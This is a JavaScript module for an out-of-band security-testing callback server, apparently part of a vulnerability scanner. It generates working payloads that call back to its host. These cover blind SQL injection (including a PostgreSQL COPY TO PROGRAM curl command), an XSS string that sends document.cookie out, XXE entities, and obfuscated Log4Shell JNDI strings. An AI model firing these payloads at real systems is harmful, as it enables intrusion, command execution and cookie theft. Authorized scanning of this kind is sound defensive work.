// backend/src/oast/oastServer.js
// Out-of-Band Application Security Testing (OAST) Callback Server
// Provides DNS + HTTP callback infrastructure for blind vulnerability detection
// Supports: Blind SQLi, Stored XSS, SSRF, XXE, Log4Shell

import http from 'http';
import { EventEmitter } from 'events';
import { v4 as uuidv4 } from 'uuid';

/**
 * OAST Callback Server
 * 
 * Runs a lightweight HTTP server that listens for callbacks from
 * injected payloads. When a target application makes a request to
 * the callback domain, it proves the vulnerability is exploitable.
 * 
 * In local mode, only the HTTP callback server is used.
 * In production mode, a DNS server (dns2) can be added.
 */
class OASTServer extends EventEmitter {
    constructor(options = {}) {
        super();
        this.domain = options.domain || process.env.OAST_DOMAIN || 'localhost';
        this.httpPort = options.httpPort || parseInt(process.env.OAST_HTTP_PORT) || 9999;
        this.dnsPort = options.dnsPort || parseInt(process.env.OAST_DNS_PORT) || 5353;
        this.mode = options.mode || process.env.OAST_MODE || 'local';

        // In-memory callback store: payloadId -> callback data
        this.callbacks = new Map();
        // Scan-to-payloads index: scanId -> Set<payloadId>
        this.scanIndex = new Map();
        // Pending listeners: payloadId -> [resolve callbacks]
        this.pendingListeners = new Map();

        this.httpServer = null;
        this.dnsServer = null;
        this.running = false;
    }

    /**
     * Start the OAST callback servers
     */
    async start() {
        if (this.running) return;

        // Start HTTP callback server
        await this._startHttpServer();

        // Start DNS server if in production mode and dns2 is available
        if (this.mode === 'production') {
            await this._startDnsServer();
        }

        this.running = true;
        console.log(`🔔 OAST Server started [mode=${this.mode}]`);
        console.log(`   HTTP callbacks: http://${this.domain}:${this.httpPort}`);
        if (this.mode === 'production') {
            console.log(`   DNS callbacks:  port ${this.dnsPort}`);
        }
    }

    /**
     * Stop all OAST servers
     */
    async stop() {
        if (!this.running) return;

        if (this.httpServer) {
            await new Promise((resolve) => {
                this.httpServer.close(resolve);
            });
            this.httpServer = null;
        }

        if (this.dnsServer) {
            try {
                this.dnsServer.close();
            } catch (e) { /* ignore */ }
            this.dnsServer = null;
        }

        this.running = false;
        console.log('🔔 OAST Server stopped');
    }

    /**
     * Generate a unique payload identifier for a scan
     * @param {string} scanId - The scan this payload belongs to
     * @param {string} testType - Type of test (sqli, xss, ssrf, xxe, log4shell)
     * @param {string} context - Additional context (param name, injection point)
     * @returns {object} Payload configuration with callback URLs
     */
    generatePayload(scanId, testType, context = '') {
        const payloadId = uuidv4().replace(/-/g, '').substring(0, 16);
        const subdomain = `${payloadId}.${scanId.substring(0, 8)}`;

        // Track scan -> payload mapping
        if (!this.scanIndex.has(scanId)) {
            this.scanIndex.set(scanId, new Set());
        }
        this.scanIndex.get(scanId).add(payloadId);

        // Build callback URLs based on mode
        let callbackDomain, httpCallback, dnsPayload;

        if (this.mode === 'local') {
            callbackDomain = `${this.domain}:${this.httpPort}`;
            httpCallback = `http://${this.domain}:${this.httpPort}/cb/${payloadId}`;
            dnsPayload = httpCallback; // In local mode, DNS payloads use HTTP
        } else {
            callbackDomain = `${subdomain}.${this.domain}`;
            httpCallback = `http://${callbackDomain}/cb/${payloadId}`;
            dnsPayload = `${subdomain}.${this.domain}`;
        }

        return {
            payloadId,
            scanId,
            testType,
            context,
            callbackDomain,
            httpCallback,
            dnsPayload,
            // Pre-built payloads for common injection scenarios
            payloads: this._buildInjectionPayloads(payloadId, httpCallback, dnsPayload, testType)
        };
    }

    /**
     * Build context-specific injection payloads
     */
    _buildInjectionPayloads(payloadId, httpCallback, dnsPayload, testType) {
        const payloads = {};

        switch (testType) {
            case 'sqli':
                // OAST-based blind SQL injection (DNS exfiltration)
                payloads.mssql = `'; exec master..xp_dirtree '//${dnsPayload}/a'--`;
                payloads.mysql = `' UNION SELECT LOAD_FILE('//${dnsPayload}/a')-- `;
                payloads.oracle = `'||(SELECT UTL_HTTP.REQUEST('${httpCallback}') FROM DUAL)||'`;
                payloads.postgresql = `'; COPY (SELECT '') TO PROGRAM 'curl ${httpCallback}'--`;
                payloads.generic = `' AND 1=(SELECT 1 FROM (SELECT LOAD_FILE(CONCAT('//',${payloadId},'.${dnsPayload}/a')))x)--`;
                break;

            case 'xss':
                // Stored XSS payloads that phone home via OAST
                payloads.script = `<script>new Image().src='${httpCallback}/xss?c='+document.cookie</script>`;
                payloads.img = `<img src=x onerror="fetch('${httpCallback}/xss')">`;
                payloads.svg = `<svg onload="new Image().src='${httpCallback}/xss'">`;
                payloads.body = `<body onload="fetch('${httpCallback}/xss')">`;
                break;

            case 'ssrf':
                // SSRF callback payloads
                payloads.http = httpCallback;
                payloads.dns = dnsPayload;
                payloads.withPath = `${httpCallback}/ssrf`;
                break;

            case 'xxe':
                // XXE payloads that trigger OAST callbacks
                payloads.classic = `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "${httpCallback}/xxe">]><root>&xxe;</root>`;
                payloads.parameter = `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "${httpCallback}/xxe">%xxe;]><root>test</root>`;
                payloads.blind = `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "${httpCallback}/xxe.dtd">%dtd;]><root>test</root>`;
                break;

            case 'log4shell':
                // Log4Shell (CVE-2021-44228) JNDI injection payloads
                payloads.basic = `\${jndi:ldap://${dnsPayload}/a}`;
                payloads.lower = `\${jndi:\${lower:l}\${lower:d}\${lower:a}\${lower:p}://${dnsPayload}/a}`;
                payloads.env = `\${jndi:ldap://${dnsPayload}/\${env:USER}}`;
                payloads.nested = `\${\${lower:j}ndi:\${lower:l}\${lower:d}a\${lower:p}://${dnsPayload}/a}`;
                payloads.obfuscated = `\${j\${::-n}d\${::-i}:ldap://${dnsPayload}/a}`;
                break;
        }

        return payloads;
    }

    /**
     * Record a callback from a target application
     * @param {string} payloadId - The payload that triggered the callback
     * @param {object} data - Callback metadata
     */
    recordCallback(payloadId, data) {
        const callbackData = {
            payloadId,
            protocol: data.protocol || 'http',
            sourceIp: data.sourceIp || 'unknown',
            requestData: data.requestData || {},
            receivedAt: new Date().toISOString(),
            matched: false,
            userAgent: data.userAgent || null,
            path: data.path || '/',
            method: data.method || 'GET'
        };

        this.callbacks.set(payloadId, callbackData);
        this.emit('callback', callbackData);

        console.log(`🔔 OAST Callback received: ${payloadId} from ${callbackData.sourceIp} [${callbackData.protocol}]`);

        // Resolve any pending listeners waiting for this callback
        if (this.pendingListeners.has(payloadId)) {
            const listeners = this.pendingListeners.get(payloadId);
            for (const resolve of listeners) {
                resolve(callbackData);
            }
            this.pendingListeners.delete(payloadId);
        }
    }

    /**
     * Check if a callback was received for a payload
     * @param {string} payloadId
     * @returns {object|null} Callback data or null
     */
    getCallback(payloadId) {
        return this.callbacks.get(payloadId) || null;
    }

    /**
     * Get all callbacks for a scan
     * @param {string} scanId
     * @returns {Array} Array of callback data
     */
    getCallbacksForScan(scanId) {
        const payloadIds = this.scanIndex.get(scanId);
        if (!payloadIds) return [];

        const results = [];
        for (const pid of payloadIds) {
            const cb = this.callbacks.get(pid);
            if (cb) results.push(cb);
        }
        return results;
    }

    /**
     * Wait for a callback with timeout
     * @param {string} payloadId
     * @param {number} timeoutMs - Maximum time to wait (default 30s)
     * @returns {Promise<object|null>} Callback data or null if timed out
     */
    waitForCallback(payloadId, timeoutMs = 30000) {
        // Check if already received
        const existing = this.callbacks.get(payloadId);
        if (existing) return Promise.resolve(existing);

        return new Promise((resolve) => {
            // Set up listener
            if (!this.pendingListeners.has(payloadId)) {
                this.pendingListeners.set(payloadId, []);
            }
            this.pendingListeners.get(payloadId).push(resolve);

            // Set timeout
            setTimeout(() => {
                const listeners = this.pendingListeners.get(payloadId);
                if (listeners) {
                    const idx = listeners.indexOf(resolve);
                    if (idx >= 0) {
                        listeners.splice(idx, 1);
                        if (listeners.length === 0) {
                            this.pendingListeners.delete(payloadId);
                        }
                    }
                }
                resolve(null);
            }, timeoutMs);
        });
    }

    /**
     * Clean up callbacks for a completed scan
     * @param {string} scanId
     */
    cleanupScan(scanId) {
        const payloadIds = this.scanIndex.get(scanId);
        if (payloadIds) {
            for (const pid of payloadIds) {
                this.callbacks.delete(pid);
                this.pendingListeners.delete(pid);
            }
            this.scanIndex.delete(scanId);
        }
    }

    /**
     * Start the HTTP callback server
     */
    async _startHttpServer() {
        return new Promise((resolve, reject) => {
            this.httpServer = http.createServer((req, res) => {
                const clientIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
                const url = req.url;

                // Health check endpoint
                if (url === '/oast/health') {
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({
                        status: 'online',
                        mode: this.mode,
                        domain: this.domain,
                        lastCallback: this.callbacks.size > 0 ? Array.from(this.callbacks.values()).pop().timestamp : null,
                        callbackCount: this.callbacks.size
                    }));
                    return;
                }

                const sourceIp = req.socket.remoteAddress || 'unknown';
                const parsedUrl = new URL(req.url, `http://${req.headers.host}`);
                const path = parsedUrl.pathname;

                // Extract payloadId from URL path: /cb/{payloadId} or /cb/{payloadId}/...
                const pathParts = path.split('/').filter(Boolean);
                let payloadId = null;

                if (pathParts[0] === 'cb' && pathParts[1]) {
                    payloadId = pathParts[1];
                }

                // Also check subdomain for payloadId (production mode)
                if (!payloadId && req.headers.host) {
                    const hostParts = req.headers.host.split('.');
                    if (hostParts.length > 2) {
                        payloadId = hostParts[0];
                    }
                }

                if (payloadId) {
                    // Record the callback
                    this.recordCallback(payloadId, {
                        protocol: 'http',
                        sourceIp,
                        method: req.method,
                        path,
                        userAgent: req.headers['user-agent'],
                        requestData: {
                            headers: req.headers,
                            query: parsedUrl.searchParams ? Object.fromEntries(parsedUrl.searchParams) : {},
                            path,
                            method: req.method,
                            host: req.headers.host
                        }
                    });
                }

                // Always respond with a minimal valid response
                res.writeHead(200, {
                    'Content-Type': 'text/plain',
                    'Access-Control-Allow-Origin': '*',
                    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
                    'Access-Control-Allow-Headers': '*'
                });
                res.end('ok');
            });

            this.httpServer.on('error', (err) => {
                if (err.code === 'EADDRINUSE') {
                    console.warn(`⚠️ OAST HTTP port ${this.httpPort} in use, trying ${this.httpPort + 1}`);
                    this.httpPort++;
                    this.httpServer.listen(this.httpPort, bindHost);
                } else {
                    reject(err);
                }
            });

            // Bind to 127.0.0.1 in local mode to match Node's IPv4/IPv6 resolution
            // In production, bind to 0.0.0.0 to accept external callbacks
            const bindHost = this.mode === 'local' ? '127.0.0.1' : '0.0.0.0';
            this.httpServer.listen(this.httpPort, bindHost, () => {
                resolve();
            });
        });
    }

    /**
     * Start the DNS callback server (production mode only)
     */
    async _startDnsServer() {
        try {
            const dns2 = await import('dns2');
            const { Packet } = dns2;

            this.dnsServer = dns2.createServer({
                udp: true,
                handle: (request, send) => {
                    const response = Packet.createResponseFromRequest(request);
                    const [question] = request.questions;

                    if (question) {
                        const name = question.name;
                        // Extract payloadId from subdomain: {payloadId}.{scanId}.callback.secora.io
                        const parts = name.split('.');
                        if (parts.length >= 2) {
                            const payloadId = parts[0];

                            this.recordCallback(payloadId, {
                                protocol: 'dns',
                                sourceIp: request.remoteAddress || 'unknown',
                                requestData: {
                                    queryName: name,
                                    queryType: question.type
                                }
                            });
                        }

                        // Respond with a valid A record pointing to our server
                        response.answers.push({
                            name: question.name,
                            type: Packet.TYPE.A,
                            class: Packet.CLASS.IN,
                            ttl: 60,
                            address: '127.0.0.1'
                        });
                    }

                    send(response);
                }
            });

            await this.dnsServer.listen({
                udp: this.dnsPort
            });
        } catch (err) {
            console.warn(`⚠️ DNS server failed to start (dns2 may not be installed): ${err.message}`);
            console.warn('   OAST will operate in HTTP-only mode');
        }
    }
}

// Singleton instance
let _instance = null;

/**
 * Get or create the global OAST server instance
 */
export function getOASTServer(options = {}) {
    if (!_instance) {
        _instance = new OASTServer(options);
    }
    return _instance;
}

/**
 * Start the global OAST server
 */
export async function startOASTServer(options = {}) {
    const server = getOASTServer(options);
    await server.start();
    return server;
}

/**
 * Stop the global OAST server
 */
export async function stopOASTServer() {
    if (_instance) {
        await _instance.stop();
        _instance = null;
    }
}

export { OASTServer };
export default OASTServer;
